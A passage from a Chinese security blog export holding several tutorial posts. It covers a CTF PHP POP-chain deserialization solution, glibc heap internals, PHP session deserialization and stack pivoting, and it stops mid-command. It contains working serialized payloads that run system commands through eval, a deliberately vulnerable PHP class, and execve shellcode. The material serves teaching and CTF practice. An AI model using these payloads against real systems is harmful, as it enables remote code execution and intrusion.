__construct()函数，初始化成员变量oop为a类的实例； __destruct()函数，调用oop实例的action()方法； 再看看其他几个类： a类只有输出Hello World的action()方法，无漏洞点； b类有个action()方法，含有成员变量file和token，绕过token校验之后就过滤file的跨目录，然后直接输出目标文件的flag变量值； c类有个execcmd()方法，但是和opps类__destruct()函数中调用的action()方法完全不同名，就是个坑哈哈； 这么说，能利用的只有b类，且和源码注释中提示的flag在flag.php中吻合，那就直接构造payload即可： 12345678910111213141516&lt;?php class oops &#123; protected $oop; function __construct() &#123; $this-&gt;oop = new b(); &#125; &#125; class b &#123; private $file = "flag.php"; private $token = "a"; &#125; echo urlencode(serialize(new oops()));?&gt; 输出参数c的exp为： 1O%3A4%3A%22oops%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00oop%22%3BO%3A1%3A%22b%22%3A2%3A%7Bs%3A7%3A%22%00b%00file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A8%3A%22%00b%00token%22%3Bs%3A1%3A%22a%22%3B%7D%7D getflag最后结合前面a、b参数的Bypass exp，直接构造报文发包即可get flag： 0x04 参考php对象注入-pop链的构造 php反序列化pop链一则 POP链学习| cL0und]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆基础]]></title>
    <url>%2F2019%2F04%2F27%2F%E5%A0%86%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[网上太多关于这方面的文章了，这里不再重新造轮子了，直接引用ctf wiki以及其他的一些文章的说明，自己再添点东西就好。 0x01 何为堆 在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器。 堆管理器处于用户程序与内核中间，主要做以下工作 响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。 管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。 Linux 中早期的堆分配与回收由 Doug Lea 实现，但它在并行处理多个线程时，会共享进程的堆内存空间。因此，为了安全性，一个线程使用堆时，会进行加锁。然而，与此同时，加锁会导致其它线程无法使用堆，降低了内存分配和回收的高效性。同时，如果在多线程使用时，没能正确控制，也可能影响内存分配和回收的正确性。Wolfram Gloger 在 Doug Lea 的基础上进行改进使其可以支持多线程，这个堆分配器就是 ptmalloc 。在 glibc-2.3.x. 之后，glibc 中集成了 ptmalloc2。 目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。 需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。 0x02 堆的基本操作这里主要说下基本的堆操作（包括堆的分配，回收，堆分配背后的系统调用）以及堆目前的多线程支持等。 malloc1malloc(size_t n) malloc 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理 当 n=0 时，返回当前系统允许的堆的最小内存块。 当 n 为负数时，由于在大多数系统上，size_t 是无符号数（这一点非常重要），所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。 free1free(void* p) free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。 此外，该函数也同样对异常情况进行了处理 当 p 为空指针时，函数不执行任何操作。 当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 double free。 除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。 内存分配背后的系统调用 在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 (s)brk 函数以及 mmap, munmap 函数。 如下图所示，我们主要考虑对堆进行申请内存块的操作。 (s)brk 对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同 不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。 开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。 具体效果如下图（这个图片与网上流传的基本一致，这里是因为要画一张大图，所以自己单独画了下）所示 示例： 在每一次执行完操作后，都执行了 getchar() 函数，这是为了方便查看程序真正的映射。 12345678910111213141516171819202122232425262728293031/* sbrk and brk example */#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;int main()&#123; void *curr_brk, *tmp_brk = NULL; printf("Welcome to sbrk example:%d\n", getpid()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk(0); printf("Program Break Location1:%p\n", curr_brk); getchar(); /* brk(addr) increments/decrements program break location */ brk(curr_brk+4096); curr_brk = sbrk(0); printf("Program break Location2:%p\n", curr_brk); getchar(); brk(tmp_brk); curr_brk = sbrk(0); printf("Program Break Location3:%p\n", curr_brk); getchar(); return 0;&#125; 在第一次调用brk()之前 可以看出，并没有出现堆。此时： start_brk = end_data = brk = 0x0x230d000 第一次调用brk()——增加内存 已经出现了堆段。 1brk(curr_brk+4096); 通过增加brk的大小来向OS申请内存，较之前申请了0x1000即4096字节的内存空间。此时： start_brk = end_data = 0x0230d000 brk = 0x0230e000 其中，关于堆的那一行 0x0230d000是相应堆的起始地址 rw-p表明堆具有可读可写权限，并且属于隐私数据 00000000 表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为0 00:00是主从 (Major/mirror) 的设备号，这部分内容也不是从文件中映射得到的，所以也都为0 0表示着Inode 号。由于这部分内容并不是从文件中映射得到的，所以为0 第二次调用brk()——减少内存 1brk(tmp_brk); 通过减少brk的大小，使堆的内存空间减至初始的大小。此时： start_brk = end_data = brk = 0x0x230d000 恢复为了之前的状态，没有heap段。 mmap malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。 示例： 123456789101112131415161718192021222324252627282930313233343536/* Private anonymous mapping example using mmap syscall */#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;void static inline errExit(const char* msg)&#123; printf("%s failed. Exiting the process\n", msg); exit(-1);&#125;int main()&#123; int ret = -1; printf("Welcome to private anonymous mapping example::PID:%d\n", getpid()); printf("Before mmap\n"); getchar(); char* addr = NULL; addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); if (addr == MAP_FAILED) errExit("mmap"); printf("After mmap\n"); getchar(); /* Unmap mapped region. */ ret = munmap(addr, (size_t)132*1024); if(ret == -1) errExit("munmap"); printf("After munmap\n"); getchar(); return 0;&#125; 在执行 mmap 之前 可以从下面的输出看到，目前只有. so文件的mmap段： mmap 后 从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了7f2a92624000到7f2a92645000的mmap段： munmap 从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子了： 多线程支持 在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。 示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* Per thread arena example. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;void* threadFunc(void* arg) &#123; printf("Before malloc in thread 1\n"); getchar(); char* addr = (char*) malloc(1000); printf("After malloc and before free in thread 1\n"); getchar(); free(addr); printf("After free in thread 1\n"); getchar();&#125;int main() &#123; pthread_t t1; void* s; int ret; char* addr; printf("Welcome to per thread arena example::%d\n",getpid()); printf("Before malloc in main thread\n"); getchar(); addr = (char*) malloc(1000); printf("After malloc and before free in main thread\n"); getchar(); free(addr); printf("After free in main thread\n"); getchar(); ret = pthread_create(&amp;t1, NULL, threadFunc, NULL); if(ret) &#123; printf("Thread creation error\n"); return -1; &#125; ret = pthread_join(t1, &amp;s); if(ret) &#123; printf("Thread join error\n"); return -1; &#125; return 0;&#125; 注意在gcc编译时加上-lpthread参数，否则会编译出错，因为pthread不是Linux下的默认的库，也就是在链接的时候，无法找到phread库中函数的入口地址，于是链接会失败。 第一次申请之前 没有heap段。 第一次申请后 heap段被建立了，并且它就紧邻着数据段，这说明malloc的背后是用brk()函数来实现的。同时需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了|0x01291000-0x012b2000|=0x21000 个字节的堆。这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。我们称这一块连续的内存区域为arena。此外，我们称由主线程申请的内存为main_arena。后续的申请的内存会一直从这个arena 中获取，直到空间不足。当arena空间不足时，它可以通过增加brk的方式来增加堆的空间。类似地，arena也可以通过减小brk来缩小自己的空间。 在主线程释放内存后 对应的arena并没有进行回收，而是交由glibc来进行管理。当后面程序再次申请内存时，在glibc中管理的内存充足的情况下，glibc就会根据堆分配的算法来给程序分配相应的内存。 在第一个线程 malloc 之前 可以看到并没有出现与线程1相关的堆，但是出现了与线程1相关的栈。 第一个线程 malloc 后 可以看出线程1的堆段被建立了，而且它所在的位置为内存映射段区域，同样大小也是132KB(7fd1a0000000-7fd1a0021000)。因此这表明该线程申请的堆时，背后对应的函数为mmap函数。同时可以看出实际真的分配给程序的内存为64M(7fd1a0000000-7fd1a4000000)，而且只有132KB的部分具有可读可写权限，这一块连续的区域成为thread arena。 注意： 当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。 在第一个线程释放内存后 可以看到，这样释放内存同样不会把内存重新给系统。 0x03 堆相关数据结构与堆相关的数据结构主要分为 宏观结构，包含堆的宏观信息，可以通过这些数据结构索引堆的基本信息。 微观结构，用于具体处理堆的分配与回收中的内存块。 微观结构malloc_chunk概述 在程序的执行过程中，称由malloc()申请的内存为chunk。这块内存在ptmalloc内部用malloc_chunk结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。 无论一个chunk的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。虽然它们使用了同一个数据结构，但根据是否被释放，它们的表现形式会有所不同。 malloc_chunk的结构如下： 123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 首先，这里给出一些必要的解释 INTERNAL_SIZE_T，SIZE_SZ，MALLOC_ALIGN_MASK： 12345/* The corresponding word size. */#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))/* The corresponding bit mask value. */#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) 一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。 每个字段的具体的解释如下： prev_size, 如果该 chunk 的物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。 size，该 chunk 的大小，大小必须是 2 SIZE_SZ 的整数倍。如果申请的内存大小不是 2 SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示 NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。 IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。 PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。 fd，bk。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下 fd 指向下一个（非物理相邻）空闲的 chunk bk 指向上一个（非物理相邻）空闲的 chunk 通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理 fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。 fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。 一个已经分配的 chunk 的样子如下。我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。 当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。这就是 chunk 中的空间复用。 1234567891011121314chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) .next . |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下： 1234567891011121314151617chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`head:&apos; | Size of chunk, in bytes |A|0|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . next . |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`foot:&apos; | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 可以发现，如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小 本身的 size 字段会记录， 它后面的 chunk 会记录。 一般情况下，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。 ！！！一些关于堆的约束，后面详细考虑！！！ 12345678910111213141516171819/* The three exceptions to all this are: 1. The special chunk `top&apos; doesn&apos;t bother using the trailing size field since there is no next contiguous chunk that would have to index off it. After initialization, `top&apos; is forced to always exist. If it would become less than MINSIZE bytes long, it is replenished. 2. Chunks allocated via mmap, which have the second-lowest-order bit M (IS_MMAPPED) set in their size fields. Because they are allocated one-by-one, each must contain its own trailing size field. If the M bit is set, the other bits are ignored (because mmapped chunks are neither in an arena, nor adjacent to a freed chunk). The M bit is also used for chunks which originally came from a dumped heap via malloc_set_state in hooks.c. 3. Chunks in fastbins are treated as allocated chunks from the point of view of the chunk allocator. They are consolidated with their neighbors only in bulk, in malloc_consolidate.*/ … 0x04 参考堆概述 堆相关数据结构]]></content>
      <categories>
        <category>二进制基础</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>堆溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP session反序列化漏洞]]></title>
    <url>%2F2019%2F04%2F21%2FPHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x01 PHP session序列化机制当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。 session序列化及反序列化处理器PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式： 处理器 对应的存储格式 php 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 php_binary 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 php_serialize (php&gt;=5.5.4) 经过 serialize() 函数反序列处理的数组 与session存储相关的配置项配置文件php.ini中含有这几个与session存储相关的配置项： 123session.save_path ="E:/wamp64/tmp" --设置session的存储路径,默认在/tmpsession.auto_start = 0 --指定会话模块是否在请求开始时启动一个会话,默认为0不启动session.serialize_handler = php --定义用来序列化/反序列化的处理器名字。默认使用php PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器，默认为php。如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’)，如下所示： 1234&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();// do something 存储机制php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。 存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。 下面用个简单的Demo看看存储的形式： example.php，这时是使用默认的处理器即PHP： 1234&lt;?phpsession_start();$_SESSION['m7'] = $_GET['m7'];?&gt; 可在session.save_path对应路径下看到一个新生成的session文件，这里名为sess_cj15cikdujk6uv3bdq6qvonbe7，可以看到存储格式为：键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 添加一行代码修改处理器为php_serialize： 12345&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['m7'] = $_GET['m7'];?&gt; 格式：经过serialize()函数反序列处理的数组 修改处理器为php_binary： 12345&lt;?phpini_set('session.serialize_handler','php_binary');session_start();$_SESSION['m7'] = $_GET['m7'];?&gt; 可以看到：键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 0x02 PHP session反序列化漏洞PHP session反序列化漏洞，简单点说，就是当网站序列化并存储Session与反序列化并读取Session的方式不同时就可能导致session反序列化漏洞的产生。 漏洞Demosave.php，和前面的demo一样，这里用的是php_serialize处理器： 12345&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['m7'] = $_GET['m7'];?&gt; session_vul.php，这里用的是默认的php处理器，可以不添加该行： 123456789101112131415161718192021&lt;?php ini_set('session.serialize_handler','php');session_start();class mi1k7ea&#123; var $a; function __destruct()&#123; eval($this-&gt;a); &#125; // function __destruct()&#123; // system($this-&gt;a); // &#125; // function __sleep()&#123; // eval($this-&gt;a); // return array('a'); // &#125; // function __wakeup()&#123; // eval($this-&gt;a); // &#125;&#125;?&gt; 访问包含恶意构造序列化对象的URL： 1save.php?m7=|O:7:&quot;mi1k7ea&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125; 打开session文件可看到序列化存储的内容，再访问session_vul.php即可看到php代码被执行了： 这是因为php引擎会以|作为key和value的分隔符，将a:1:{s:2:”m7”;s:45:”作为SESSION的key，将O:7:”mi1k7ea”:1:{s:1:”a”;s:10:”phpinfo();”;}作为value，然后进行反序列化，就会实例化mi1k7ea对象，最后就会执行__destruct()函数中的eval()方法，相当于执行如下： 12$_SESSION['m7'] = new mi1k7ea();$_SESSION['m7']-&gt;a = 'phpinfo();'; 0x03 题目这里网上看的一道session反序列化题目，在此复现一下。 三个PHP文件如下： class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phphighlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));//show_source(__FILE__);class foo1&#123; public $varr; function __construct()&#123; $this-&gt;varr = "i.php"; &#125; function __destruct()&#123; if(file_exists($this-&gt;varr))&#123; echo "&lt;br&gt;文件".$this-&gt;varr."存在&lt;br&gt;"; &#125; echo "&lt;br&gt;这是foo1的析构函数&lt;br&gt;"; &#125;&#125;class foo2&#123; public $varr; public $obj; function __construct()&#123; $this-&gt;varr = '1234567890'; $this-&gt;obj = null; &#125; function __toString()&#123; $this-&gt;obj-&gt;execute(); return $this-&gt;varr; &#125; function __desctuct()&#123; echo "&lt;br&gt;这是foo2的析构函数&lt;br&gt;"; &#125;&#125;class foo3&#123; public $varr; function execute()&#123; eval($this-&gt;varr); &#125; function __desctuct()&#123; echo "&lt;br&gt;这是foo3的析构函数&lt;br&gt;"; &#125;&#125;?&gt; i.php 12345678&lt;?php ini_set('session.serialize_handler', 'php'); require("./class.php"); session_start(); $obj = new foo1(); $obj-&gt;varr = "phpinfo.php";?&gt; phpinfo.php 12345678&lt;?php session_start(); require("./class.php"); $f3 = new foo3(); $f3-&gt;varr = "phpinfo();"; $f3-&gt;execute();?&gt; 可以看到，i.php中用的是php处理器。 在php.ini中的关键配置，注意配置中的session.serialize_handler： 123session.serialize_handler = php_serializesession.upload_progress.cleanup=Offsession.upload_progress.enabled=On 可以访问phpinfo.php查看配置信息： 默认是采用php处理器处理session，session.upload_progress.cleanup配置为Off，session.upload_progress.enabled配置为On。 说下session.upload_progress.enabled，当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在\$_SESSION中获得。当PHP检测到这种POST请求时，它会在\$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 当前代码的话没有向服务器提交数据，但是现在session.upload_progress.enabled是开启的，所以可以通过上传文件，从而在session文件中写入数据。 也就是说，利用点是通过session.upload_progress.enabled来上传文件向session文件中写入php_serialize处理器格式的内容，从而与i.php中php处理器不同进而造成session反序列化漏洞的存在。 poc.php，用于生成序列化poc，在foo1中的构造函数中定义\$varr的值为foo2的实例，在foo2中定义\$obj为foo3的实例，在foo3中定义\$varr的值为system(‘whoami’);： 1234567891011121314151617181920212223242526&lt;?phpclass foo3&#123; public $varr; function __construct()&#123; $this-&gt;varr = "system('whoami');"; &#125;&#125; class foo2&#123; public $varr; public $obj; function __construct()&#123; $this-&gt;varr = '1'; $this-&gt;obj = new foo3(); &#125;&#125; class foo1&#123; public $varr; function __construct()&#123; $this-&gt;varr = new foo2(); &#125;&#125; echo serialize(new foo1());?&gt; form.html，一个向i.php提交POST请求的表单文件，其中包括PHP_SESSION_UPLOAD_PROGRESS变量： 12345&lt;form action="http://127.0.0.1/i.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; Burpsuite截断该form.html发送的POST请求，在PHP_SESSION_UPLOAD_PROGRESS一栏中的值加上poc.php生成的poc就能够成功执行命令了： 1|O:4:&quot;foo1&quot;:1:&#123;s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:&#123;s:4:&quot;varr&quot;;s:1:&quot;1&quot;;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:&#123;s:4:&quot;varr&quot;;s:19:&quot;system(&quot;ipconfig&quot;);&quot;;&#125;&#125;&#125; 换其他命令的话直接换poc.php生成的poc即可： 0x04 参考关于PHP SESSION反序列化]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[花式栈溢出之stack pivoting]]></title>
    <url>%2F2019%2F04%2F20%2F%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bstack-pivoting%2F</url>
    <content type="text"><![CDATA[0x01 stack pivotingstack pivoting，即劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。 什么情况下需要利用stack pivot? 栈溢出的字节比较少，无法直接利用溢出字节进行ROP； 开启了 PIE 保护，栈地址未知并且无法泄露，但是利用某些利用技术时必须要知道栈地址，就可以通过stack pivot将栈劫持到相应的区域； stack pivot能够使得一些非栈溢出的漏洞变成为栈溢出漏洞从而进行攻击，典型：可以将程序劫持到heap空间中； stack pivot有什么利用条件? 1、存在内容可控的内存，位置已知，拥有读写的权限，有几个典型的位置可供选择： （1）一个是bss段末有较大的空间，因为进程内存按页分配，分配给bss段的内存大小至少一个页(4k，x1000)大小，一般bss段的内容是用不了这么大的空间的，并且bss段分配的内存页拥有读写权限，是stack pivot的好目标； （2）另一个是heap空间，这个不用赘述了，但是需要注意泄露堆地址； 2、控制rsp(esp)。一般来说，控制栈指针会使用 ROP，需要相应的Gadgets，常见的控制栈指针的Gadgets一般是： 1pop rsp/esp 其中有一个最典型，在x64的libc_csu_init通过Godgets中，做一个适当偏移能够得到这样一个Gadgets： 123456789101112131415mov rdx,r13mov rsi,r14mov edi,r15dcall QWORD PTR [r12+rbx*8]add rbx,0x1cmp rbx,rbpjne 405660 &lt;__libc_csu_init+0x40&gt;add rsp,0x8pop rbxpop rbp offset: pop rsppop r12 pop r12pop r13 pop r13 pop r14 pop r14pop r15 pop r15retn ret 可见其实就是ret2csu的经典Gadget，是一个pop rsp ret，如果将ret的地址改成leave ，ret,那么我们正常通过pop rbp；pop r12;pop r13;pop r14执行到返回时，将rbp中的值相应设置好也可以劫持rsp。 或者其他诸如add rsp，0x100等能够劫持rsp寄存器值的Gadget。 stack pivoting适用场景： 我们控制了橙色部分区域，但是中间有一段不可控制的内存，这时，我们需要控制rsp跳转到橙色部分，继续执行我们的Rop指令，这就是stack pivot，如下图是最简单的一种，通过add esp, 0x40c;ret的gadget来实现劫持栈指针： 以下的一些Gadgets都是可以通过对esp的操作来实现劫持栈指针： 0x02 X-CTF Quals 2016 - b0verfl0w题目下载地址 运行程序，询问名字并输入内容，再输出出来；查看程序是个32位的动态链接文件；查看安全编译选项，发现啥都没开： GDB计算溢出至ret处的偏移量为36： 打开IDA分析： 这里看到是通过fgets()来获取用户输入内容，存在明显的栈溢出漏洞，限定了只能输入50个字节；同时看到变量s相对ebp的偏移量为20h=16*2d=32d，再加上ebp的4个字节就和前面计算的溢出偏移量是一致的。 由此可以算出能够溢出的字节数为50-36=14。 shellcode选择 这里因为没有开启NX，所以我们可以直接在栈上写shellcode。 我们来看下pwntools的shellcode长度是多少： 12ski12@ubuntu:~/ctf/pwn/stack$ python -c "from pwn import *;print len(asm(shellcraft.sh()))"44 可以看到是44个字节。而我们知道变量s处到ret处的偏移量为36个字节，是塞不下这个shellcode的。 那就换一个更简短的shellcode如下： 1\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80 看下该shellcode的长度： 123456789101112ski12@ubuntu:~/ctf/pwn/stack$ python -c "from pwn import *;print disasm('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')" 0: 31 c9 xor ecx,ecx 2: f7 e1 mul ecx 4: 51 push ecx 5: 68 2f 2f 73 68 push 0x68732f2f a: 68 2f 62 69 6e push 0x6e69622f f: 89 e3 mov ebx,esp 11: b0 0b mov al,0xb 13: cd 80 int 0x80ski12@ubuntu:~/ctf/pwn/stack$ python -c "print 